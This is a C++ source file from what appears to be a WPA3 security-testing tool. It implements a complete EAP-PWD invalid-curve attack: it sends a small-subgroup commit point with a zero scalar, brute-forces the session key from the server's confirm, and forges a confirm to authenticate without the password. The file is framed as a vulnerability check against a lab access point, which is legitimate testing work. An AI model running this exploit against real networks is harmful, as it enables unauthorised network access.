#define OPENSSL_SUPPRESS_DEPRECATED
#include <array>
#include <chrono>
#include <optional>
#include <vector>

#include <openssl/bn.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <nlohmann/json.hpp>
#include <tins/hw_address.h>

#include "attacks/Enterprise/eap_defs.h"
#include "attacks/Enterprise/eap_helper.h"
#include "attacks/components/sniffer_helper.h"
#include "attacks/mc_mitm/MonitorSocket.h"
#include "config/RunStatus.h"
#include "logger/log.h"
#include "setup/program.h"
#include "system/ip.h"
#include "system/utils.h"
#include "system/wifi_channel.h"

using namespace std;
using namespace chrono;
using namespace Tins;
using namespace wpa3_tester::eap;
using namespace wpa3_tester::reflection;

namespace wpa3_tester::invalid_curve {

// === subgroup parameters for P-256 (group 19) ===
// generator of small-order subgroup on the quadratic twist of P-256.
// source: dragonslayer src/crypto/crypto_openssl.c (size=269 path)

//TODO popsat v dokumnetaci d'vod pro konkrétní
static constexpr array<uint8_t, 32> SUB_GX = {
    0x6b,0xfe,0x1a,0x57,0x02,0x46,0x8a,0xc7,0xe2,0xe7,0xef,0xd2,0x2a,0x25,0xcc,0xf5,
    0x1a,0xda,0xbf,0x60,0xd3,0x85,0x17,0x33,0x2f,0x07,0xd2,0x2f,0x9a,0x88,0x75,0x55
};
static constexpr array<uint8_t, 32> SUB_GY = {
    0x75,0x82,0xb0,0x15,0x15,0x68,0x89,0xef,0x88,0xe5,0x03,0x05,0x4b,0xd9,0x71,0x75,
    0xdf,0xb6,0x19,0x7c,0x94,0x32,0xa4,0xfc,0x6c,0xfb,0x07,0x5e,0xcb,0x2d,0xb9,0x2d
};
// P-256 prime p (shared by the twist)
static constexpr array<uint8_t, 32> FIELD_P = {
    0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
};
// a = −3 mod p (same as P-256)
static constexpr array<uint8_t, 32> TWIST_A = {
    0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xfc
};
// Twist b coefficient (differs from P-256)
static constexpr array<uint8_t, 32> TWIST_B = {
    0xfe,0x52,0x40,0xb6,0xee,0x72,0x73,0xd1,0x43,0x09,0xcc,0x22,0xf0,0x66,0x4a,0xd4,
    0x5a,0xd7,0x6d,0x4b,0x13,0x89,0x95,0x2c,0x3f,0xd9,0xf8,0x54,0xd5,0x5b,0xfa,0x80
};
// Group order for the twist curve
static constexpr array<uint8_t, 32> TWIST_N = {
    0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xfe,
    0x0b,0x2e,0x09,0x5b,0x89,0x8d,0xf5,0xb3,0xf5,0x9b,0x25,0xb0,0x68,0xb3,0xa4,0x7d
};

// EAP-PWD ciphersuite: group=19 (P-256), rand_func=1, prf=1
static constexpr array<uint8_t, 4> CIPHERSUITE = {0x00, 0x13, 0x01, 0x01};

// EAP-PWD H function: HMAC-SHA256 with a 32-byte all-zero key (RFC 5931 §2.4)
static array<uint8_t, 32> H(const uint8_t* data, const size_t len) {
    static constexpr uint8_t zero_key[32] = {};
    array<uint8_t, 32> out{};
    unsigned int out_len = 32;
    HMAC(EVP_sha256(), zero_key, 32, data, len, out.data(), &out_len);
    return out;
}

// Compute EAP-PWD confirm: H(k_x | e1_xy | s1 | e2_xy | s2 | ciphersuite)
static array<uint8_t, 32> pwd_confirm(
    const array<uint8_t, 32>& k_x,
    const array<uint8_t, 64>& e1, const array<uint8_t, 32>& s1,
    const array<uint8_t, 64>& e2, const array<uint8_t, 32>& s2)
{
    vector<uint8_t> buf;
    buf.reserve(32 + 64 + 32 + 64 + 32 + 4);
    auto app = [&](const auto& a){ buf.insert(buf.end(), a.begin(), a.end()); };
    app(k_x); app(e1); app(s1); app(e2); app(s2); app(CIPHERSUITE);
    return H(buf.data(), buf.size());
}

// Build EAPOL-EAP response: EAPOL header + EAP code/id/len + TYPE_PWD | opcode | payload
static vector<uint8_t> make_pwd_eapol(const uint8_t eap_id, const uint8_t opcode,
                                       const uint8_t* payload, const size_t len)
{
    const auto eap_body = static_cast<uint16_t>(2 + len);  // TYPE_PWD + opcode + payload
    const auto eap_len  = static_cast<uint16_t>(4 + eap_body);
    vector<uint8_t> pkt;
    pkt.reserve(4 + eap_len);
    pkt.push_back(0x01); pkt.push_back(0x00);
    pkt.push_back(static_cast<uint8_t>(eap_len >> 8)); pkt.push_back(static_cast<uint8_t>(eap_len & 0xff));
    pkt.push_back(CODE_RESPONSE); pkt.push_back(eap_id);
    pkt.push_back(static_cast<uint8_t>(eap_len >> 8)); pkt.push_back(static_cast<uint8_t>(eap_len & 0xff));
    pkt.push_back(TYPE_PWD); pkt.push_back(opcode);
    pkt.insert(pkt.end(), payload, payload + len);
    return pkt;
}

// Brute-force the shared k_x by trying all subgroup multiples (≤ 269 iterations).
// server_confirm = H(k_x | server_elem | server_scal | our_elem | 0^32 | ciphersuite)
static optional<array<uint8_t, 32>> brute_force_k(
    const array<uint8_t, 64>& server_elem,
    const array<uint8_t, 32>& server_scal,
    const array<uint8_t, 32>& server_confirm)
{
    BN_CTX* ctx = BN_CTX_new();
    BIGNUM* p   = BN_bin2bn(FIELD_P.data(),  32, nullptr);
    BIGNUM* a   = BN_bin2bn(TWIST_A.data(),  32, nullptr);
    BIGNUM* b   = BN_bin2bn(TWIST_B.data(),  32, nullptr);
    BIGNUM* n   = BN_bin2bn(TWIST_N.data(),  32, nullptr);
    BIGNUM* gx  = BN_bin2bn(SUB_GX.data(),   32, nullptr);
    BIGNUM* gy  = BN_bin2bn(SUB_GY.data(),   32, nullptr);

    EC_GROUP* grp = EC_GROUP_new_curve_GFp(p, a, b, ctx);
    EC_POINT* gen = EC_POINT_new(grp);
	if (EC_POINT_set_affine_coordinates_GFp(grp, gen, gx, gy, ctx) != 1) {
		log(LogLevel::ERROR, "OpenSSL issue");
	}
	EC_GROUP_set_generator(grp, gen, n, BN_value_one());

    EC_POINT* pt  = EC_POINT_new(grp);
    BIGNUM*   k   = BN_new();
    BIGNUM*   kxb = BN_new();

    array<uint8_t, 64> our_elem{};
    ranges::copy(SUB_GX, our_elem.begin());
    ranges::copy(SUB_GY, our_elem.begin() + 32);
	constexpr array<uint8_t, 32> our_scal{};

    optional<array<uint8_t, 32>> result;

	//TODO magic numbers
    for (int i = 1; i < 269 && !result; i++) {
        BN_set_word(k, static_cast<BN_ULONG>(i));
        EC_POINT_mul(grp, pt, nullptr, gen, k, ctx);
        if (EC_POINT_is_at_infinity(grp, pt)) continue;

        array<uint8_t, 32> kx_bytes{};
        EC_POINT_get_affine_coordinates_GFp(grp, pt, kxb, nullptr, ctx);
        BN_bn2binpad(kxb, kx_bytes.data(), 32);

        if (pwd_confirm(kx_bytes, server_elem, server_scal, our_elem, our_scal) == server_confirm)
            result = kx_bytes;
    }

    EC_POINT_free(pt); EC_POINT_free(gen); EC_GROUP_free(grp);
    BN_free(k); BN_free(kxb); BN_free(gx); BN_free(gy);
    BN_free(p); BN_free(a); BN_free(b); BN_free(n);
    BN_CTX_free(ctx);
    return result;
}

bool run_invalid_curve_exchange(EAP_Att& eap_att){

	if (!do_auth(eap_att)) return false;
    if (!do_assoc(eap_att)) return false;

	if(send_eap_normal_EAP(eap_att)) return false;
	if(send_eap_normal_EAP_pwd_ID(eap_att)) return false;

    // EAP-PWD-Commit: capture server commit, send scalar=0 + subgroup_gen as element
    array<uint8_t, 64> server_elem{};
    array<uint8_t, 32> server_scal{};
    {
        optional<EapPwdFrame> frame;
        const auto e = wait_eapol(eap_att, [&](const vector<uint8_t>& v){
            const auto f = parse_eap_pwd(v);
            if (f && f->opcode == PWD_OPCODE_COMMIT) { frame = f; return true; }
            return false;
        });
        if (!e || e->empty()) { log(LogLevel::WARNING, "No EAP-PWD-Commit request"); return false; }
        if (frame->pwd_data.size() < 96) {
            log(LogLevel::WARNING, "Server commit payload too short ({} bytes)", static_cast<int>(frame->pwd_data.size()));
            return false;
        }
        copy_n(frame->pwd_data.begin(),      64, server_elem.begin());
        copy_n(frame->pwd_data.begin() + 64, 32, server_scal.begin());

        // payload: elem_x(32) | elem_y(32) | scalar(32=0)
        array<uint8_t, 96> commit_payload{};
        ranges::copy(SUB_GX, commit_payload.begin());
        ranges::copy(SUB_GY, commit_payload.begin() + 32);

    	// scalar stays zero
        log(LogLevel::INFO, "Sending invalid commit (scalar=0, element=subgroup_gen)");
        send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_COMMIT, commit_payload.data(), 96));
    }

    // EAP-PWD-Confirm: brute-force k_x, compute and send our confirm
    {
        optional<EapPwdFrame> frame;
        const auto e = wait_eapol(eap_att, [&](const vector<uint8_t>& v){
            const auto f = parse_eap_pwd(v);
            if (f && f->opcode == PWD_OPCODE_CONFIRM) { frame = f; return true; }
            return false;
        });
        if (!e || e->empty()) { log(LogLevel::WARNING, "No EAP-PWD-Confirm request"); return false; }
        if (frame->pwd_data.size() < 32) {
            log(LogLevel::WARNING, "Server confirm payload too short"); return false;
        }

        array<uint8_t, 32> server_confirm{};
        copy_n(frame->pwd_data.begin(), 32, server_confirm.begin());

        log(LogLevel::INFO, "Recovering session key (brute-forcing subgroup)...");
        const auto kx = brute_force_k(server_elem, server_scal, server_confirm);
        if (!kx) {
            log(LogLevel::WARNING, "Failed to recover session key. Server may not be vulnerable.");
            return false;
        }
        log(LogLevel::INFO, "Session key recovered");

        array<uint8_t, 64> our_elem{};
        ranges::copy(SUB_GX, our_elem.begin());
        ranges::copy(SUB_GY, our_elem.begin() + 32);
		constexpr array<uint8_t, 32> our_scal{};

        const auto our_confirm = pwd_confirm(*kx, our_elem, our_scal, server_elem, server_scal);
        send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_CONFIRM, our_confirm.data(), 32));
    }

	return eap_pwd_wait_for_success(eap_att);
}

void setup_attack(RunStatus& rs) {
    copy_f(rs.config_path().parent_path() / "config/hostapd.eap_user", rs.run_folder() / "hostapd.eap_user");
    program::start(rs, "access_point");
    rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(40));
    log(LogLevel::INFO, "access_point running");
    ip::set_ip(rs, "access_point");
}

void run_attack(RunStatus& rs) {
    rs.start_observers();
    const auto& att_cfg = rs.config().at("attack_config");
    const auto attacker = rs.get_actor("attacker");
    const auto ap_actor = rs.get_actor("access_point");

    const string iface    = attacker.get(SK::iface);
    const string identity = att_cfg.at("identity").get<string>();
    const string ssid     = ap_actor->get(SK::ssid);
    const auto channel = ap_actor->get_channel();

    const HWAddress<6> our_mac(attacker.get(SK::mac));
    const HWAddress<6> ap_mac(ap_actor.get(SK::mac));

    MonitorSocket sock(iface, attacker[SK::netns]);
	EAP_Att eap_att{
		sock,
		channel,
		our_mac,
		ap_mac,
		ssid,
		identity,
		milliseconds{30000} // 30s
	};
	const bool vulnerable = run_invalid_curve_exchange(eap_att);

	rs.save_result({{"passed", vulnerable}});
    log(LogLevel::INFO, "Invalid curve attack result: {}", vulnerable ? "VULNERABLE" : "not vulnerable");
}

}